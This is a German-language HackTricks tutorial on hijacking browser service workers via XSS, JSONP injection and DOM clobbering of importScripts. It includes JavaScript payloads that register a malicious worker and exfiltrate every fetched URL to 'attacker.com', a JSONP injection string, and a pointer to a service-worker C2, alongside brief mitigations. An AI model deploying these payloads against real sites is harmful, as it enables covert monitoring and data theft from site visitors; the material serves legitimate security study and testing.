# Abusing Service Workers

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Grundinformationen

Ein **Service Worker** ist ein Skript, das von Ihrem Browser im Hintergrund ausgef√ºhrt wird, getrennt von jeder Webseite, und Funktionen erm√∂glicht, die keine Webseite oder Benutzerinteraktion erfordern, wodurch die **Offline- und Hintergrundverarbeitungs**f√§higkeiten verbessert werden. Detaillierte Informationen zu Service Workern finden Sie [hier](https://developers.google.com/web/fundamentals/primers/service-workers). Durch das Ausnutzen von Service Workern innerhalb einer verwundbaren Web-Domain k√∂nnen Angreifer die Kontrolle √ºber die Interaktionen des Opfers mit allen Seiten innerhalb dieser Domain erlangen.

### √úberpr√ºfen vorhandener Service Worker

Vorhandene Service Worker k√∂nnen im Abschnitt **Service Workers** des **Application**-Tabs in den **Entwicklertools** √ºberpr√ºft werden. Eine andere Methode ist der Besuch von [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) f√ºr eine detailliertere Ansicht.

### Push-Benachrichtigungen

**Berechtigungen f√ºr Push-Benachrichtigungen** wirken sich direkt auf die F√§higkeit eines **Service Workers** aus, ohne direkte Benutzerinteraktion mit dem Server zu kommunizieren. Wenn Berechtigungen verweigert werden, wird das Potenzial des Service Workers, eine kontinuierliche Bedrohung darzustellen, eingeschr√§nkt. Im Gegensatz dazu erh√∂ht das Gew√§hren von Berechtigungen die Sicherheitsrisiken, indem es den Empfang und die Ausf√ºhrung potenzieller Exploits erm√∂glicht.

## Angriff Erstellen eines Service Workers

Um diese Schwachstelle auszunutzen, m√ºssen Sie Folgendes finden:

* Eine M√∂glichkeit, **willk√ºrliche JS**-Dateien auf den Server hochzuladen und ein **XSS, um den Service Worker** der hochgeladenen JS-Datei zu laden
* Eine **verwundbare JSONP-Anfrage**, bei der Sie **die Ausgabe (mit willk√ºrlichem JS-Code)** **manipulieren** k√∂nnen, und ein **XSS**, um die **JSONP mit einem Payload** zu **laden**, der einen **b√∂sartigen Service Worker** **l√§dt**.

Im folgenden Beispiel werde ich einen Code pr√§sentieren, um einen **neuen Service Worker** zu **registrieren**, der das `fetch`-Ereignis abh√∂rt und **jede abgerufene URL an den Server des Angreifers sendet** (dies ist der Code, den Sie **hochladen** m√ºssten, um ihn auf den **Server** zu **laden** oder √ºber eine **verwundbare JSONP**-Antwort zu laden):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Und dies ist der Code, der den **Worker registriert** (den Code, den Sie ausf√ºhren sollten, indem Sie eine **XSS** ausnutzen). In diesem Fall wird eine **GET**-Anfrage an den **Angreifer**-Server gesendet, die **benachrichtigt**, ob die **Registrierung** des Service Workers erfolgreich war oder nicht:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
Im Falle des Missbrauchs eines anf√§lligen JSONP-Endpunkts sollten Sie den Wert in `var sw` einf√ºgen. Zum Beispiel:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Es gibt ein **C2**, das der **Ausnutzung von Service Workern** gewidmet ist, namens [**Shadow Workers**](https://shadow-workers.github.io), das sehr n√ºtzlich sein wird, um diese Schwachstellen auszunutzen.

Die **24-Stunden-Cache-Direktive** begrenzt die Lebensdauer eines b√∂sartigen oder kompromittierten **Service Workers (SW)** auf maximal 24 Stunden nach einer XSS-Schwachstellenbehebung, vorausgesetzt, der Client ist online. Um die Verwundbarkeit zu minimieren, k√∂nnen die Betreiber der Website die Time-To-Live (TTL) des SW-Skripts verringern. Entwicklern wird au√üerdem geraten, einen [**Service Worker Kill-Switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) f√ºr eine schnelle Deaktivierung zu erstellen.

## Ausnutzung von `importScripts` in einem SW √ºber DOM Clobbering

Die Funktion **`importScripts`**, die von einem Service Worker aufgerufen wird, kann **ein Skript von einer anderen Domain importieren**. Wenn diese Funktion mit einem **Parameter aufgerufen wird, den ein Angreifer** √§ndern k√∂nnte, w√§re er in der Lage, **ein JS-Skript von seiner Domain zu importieren** und XSS zu erhalten.

**Dies umgeht sogar CSP-Schutzma√ünahmen.**

**Beispiel f√ºr anf√§lligen Code:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Mit DOM Clobbering

F√ºr weitere Informationen dar√ºber, was DOM Clobbering ist, siehe:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Wenn die URL/Dom√§ne, die der SW verwendet, um **`importScripts`** aufzurufen, **innerhalb eines HTML-Elements** ist, ist es **m√∂glich, sie √ºber DOM Clobbering zu modifizieren**, um die SW **ein Skript von deiner eigenen Dom√§ne laden zu lassen**.

F√ºr ein Beispiel dazu siehe den Referenzlink.

## Referenzen

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
